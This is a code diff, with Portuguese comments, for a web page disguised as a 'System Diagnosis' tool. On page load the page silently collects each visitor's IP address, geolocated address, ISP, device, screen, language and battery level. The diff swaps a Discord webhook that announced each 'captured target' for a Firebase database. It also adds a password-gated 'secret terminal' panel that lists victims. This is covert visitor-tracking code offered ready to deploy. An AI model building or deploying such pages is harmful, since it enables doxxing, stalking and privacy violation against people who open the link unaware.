@@ -4,6 +4,10 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>System Diagnosis</title>
+<!-- Importa o Firebase para guardar os logs na nuvem -->
+<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
+
 <style>
 :root{--bg:#000000;--card:#050505;--border:#121212;--red:#ff0033;--red-glow:rgba(255,0,51,0.25);--text:#e6e6e6;--muted:#555555;--green:#00ff66;--insta:#e1306c}
 *{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New', Courier, monospace;-webkit-tap-highlight-color:transparent}
@@ -32,6 +36,20 @@ body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;justif
 /* Botão Instagram */
 .btn-insta{background:transparent;color:#e1306c;border:1px solid #33111f;padding:10px;width:100%;border-radius:6px;cursor:pointer;font-weight:700;text-transform:uppercase;font-size:0.65rem;letter-spacing:1px;transition:all 0.2s;display:block;text-decoration:none;margin-bottom:8px}
 .btn-insta:hover{background:#1a050d;border-color:var(--insta)}
+
+/* Painel Admin */
+.admin-title{font-size:0.85rem;font-weight:900;color:#fff;margin-bottom:12px;letter-spacing:1.5px}
+.stats-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px}
+.stat-box{background:#000000;border:1px solid var(--border);padding:10px;border-radius:6px;text-align:center}
+.stat-box span{display:block;font-size:1.1rem;font-weight:800;color:var(--red);margin-top:4px}
+.admin-table{width:100%;border-collapse:collapse;margin-top:8px;font-size:0.58rem;text-align:left}
+.admin-table th, .admin-table td{padding:6px 4px;border-bottom:1px solid var(--border);white-space:nowrap}
+.admin-table th{color:var(--red)}
+
+.btn-detail{background:#111;color:var(--red);border:1px solid var(--border);padding:4px 8px;border-radius:4px;cursor:pointer;font-size:0.55rem;font-weight:700}
+.btn-detail:hover{background:#222}
+
+.btn-back{background:#111;color:#fff;border:1px solid var(--border);padding:10px;width:100%;border-radius:6px;cursor:pointer;font-weight:700;text-transform:uppercase;font-size:0.65rem;margin-top:14px}
 </style>
 </head>
 <body>
@@ -54,17 +72,61 @@ body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;justif
       <div class="data-row"><span class="data-label">Bateria:</span><span id="targetBattery" class="data-val">A ler...</span></div>
     </div>
 
-    <!-- Botão Instagram -->
+    <!-- Botão Instagram (Substitua o link abaixo pelo seu) -->
     <a href="https://instagram.com/o_teu_utilizador" target="_blank" class="btn-insta">📸 Seguir no Instagram</a>
     
     <button class="btn-admin" onclick="openAdmin()">Acessar administração</button>
   </div>
 
+  <!-- Painel Administrativo -->
+  <div id="admin-screen" class="screen" style="display:none;">
+    <div class="admin-title">TERMINAL SECRETO</div>
+    
+    <div class="stats-grid">
+      <div class="stat-box">
+        <small style="color:var(--muted); font-size:0.6rem;">Acessos Totais</small>
+        <span id="totalHits">0</span>
+      </div>
+      <div class="stat-box">
+        <small style="color:var(--muted); font-size:0.6rem;">Estado</small>
+        <span style="color:var(--green)">ONLINE</span>
+      </div>
+    </div>
+
+    <p style="font-size:0.65rem; color:var(--muted); margin-bottom:6px; text-align:left;">Alvos Capturados:</p>
+    <div style="max-height:160px; overflow-y:auto;">
+      <table class="admin-table">
+        <thead>
+          <tr><th>Hora</th><th>IP</th><th>Device</th><th>Ação</th></tr>
+        </thead>
+        <tbody id="adminLogs">
+          <tr><td colspan="4" style="text-align:center; color:var(--muted);">A carregar dados da nuvem...</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <button class="btn-back" onclick="closeAdmin()">Voltar</button>
+  </div>
+
 </div>
 
 <script>
-// COLA O TEU WEBHOOK DO DISCORD AQUI EMBAIXO ENTRE AS ASPAS:
-const WEBHOOK_URL = "O_TEU_WEBHOOK_DO_DISCORD_AQUI";
+// CONFIGURAÇÃO DO FIREBASE (Substitua pelos dados do seu projeto gratuito no Firebase)
+const firebaseConfig = {
+  apiKey: "SUA_API_KEY",
+  authDomain: "SEU_PROJETO.firebaseapp.com",
+  databaseURL: "https://SEU_PROJETO-default-rtdb.firebaseio.com",
+  projectId: "SEU_PROJETO",
+  storageBucket: "SEU_PROJETO.appspot.com",
+  messagingSenderId: "SEU_MESSAGING_SENDER_ID",
+  appId: "SEU_APP_ID"
+};
+
+// Inicializa o Firebase
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+let globalLogs = [];
 
 function getDeviceInfo() {
   let ua = navigator.userAgent;
@@ -124,24 +186,17 @@ window.onload = async function() {
       document.getElementById('targetLocation').innerText = `${data.city || 'N/A'}, ${data.country_code || ''}`;
       document.getElementById('targetIsp').innerText = ispVal;
 
-      // Envia automaticamente para o teu Discord via Webhook
-      if(WEBHOOK_URL && WEBHOOK_URL.startsWith("https://")) {
-        let payload = {
-          content: `🚨 **NOVO ALVO CAPTURADO!**\n` +
-                   `• **IP:** \`${ipVal}\`\n` +
-                   `• **Endereço:** ${fullAddress}\n` +
-                   `• **Provedor:** ${ispVal}\n` +
-                   `• **Dispositivo:** ${deviceBrand}\n` +
-                   `• **Ecrã:** ${screenRes} | **Bateria:** ${batteryStatus}\n` +
-                   `• **Hora:** ${timeNow}`
-        };
-
-        fetch(WEBHOOK_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        }).catch(err => console.log('Erro ao enviar webhook'));
-      }
+      // Envia os dados do visitante para a nuvem em tempo real
+      db.ref('alvos').push({
+        time: timeNow,
+        ip: ipVal,
+        address: fullAddress,
+        isp: ispVal,
+        device: deviceBrand,
+        screen: screenRes,
+        lang: lang,
+        battery: batteryStatus
+      });
 
     } else {
       document.getElementById('targetIp').innerText = "Indisponível";
@@ -150,15 +205,63 @@ window.onload = async function() {
   } catch(e) {
     document.getElementById('targetIp').innerText = "Erro de rede";
   }
+
+  // Ouve os dados da nuvem para atualizar o painel admin em tempo real
+  db.ref('alvos').on('value', (snapshot) => {
+    globalLogs = [];
+    snapshot.forEach((childSnapshot) => {
+      globalLogs.push(childSnapshot.val());
+    });
+    updateAdminStats();
+  });
 };
 
 function openAdmin() {
   let pass = prompt('Palavra-passe de acesso:');
   if(pass === '17102007') {
-    alert('⚠️ Os registos de todos os alvos agora chegam diretamente no teu canal do Discord configurado no Webhook!');
+    document.getElementById('home-screen').style.display = 'none';
+    document.getElementById('admin-screen').style.display = 'block';
+    updateAdminStats();
   } else if(pass !== null) {
     alert('Acesso negado.');
   }
+}
+
+function closeAdmin() {
+  document.getElementById('admin-screen').style.display = 'none';
+  document.getElementById('home-screen').style.display = 'block';
+}
+
+function updateAdminStats() {
+  document.getElementById('totalHits').innerText = globalLogs.length;
+
+  let tbody = document.getElementById('adminLogs');
+  if(globalLogs.length === 0) {
+    tbody.innerHTML = `<tr><td colspan="4" style="text-align:center; color:var(--muted);">Nenhum alvo registado.</td></tr>`;
+    return;
+  }
+
+  tbody.innerHTML = globalLogs.map((log, index) => `
+    <tr>
+      <td>${log.time}</td>
+      <td><code>${log.ip}</code></td>
+      <td>${log.device}</td>
+      <td><button class="btn-detail" onclick="verDetalhes(${index})">Ver</button></td>
+    </tr>
+  `).join('');
+}
+
+function verDetalhes(index) {
+  let log = globalLogs[index];
+  alert(`📋 RELATÓRIO DO ALVO #${index + 1}\n\n` +
+        `• IP: ${log.ip}\n` +
+        `• Endereço Completo: ${log.address}\n` +
+        `• Provedor (ISP): ${log.isp}\n` +
+        `• Dispositivo: ${log.device}\n` +
+        `• Resolução do Ecrã: ${log.screen}\n` +
+        `• Idioma/Sistema: ${log.lang}\n` +
+        `• Bateria: ${log.battery}\n` +
+        `• Hora do Acesso: ${log.time}`);
 }
 </script>
 </body>
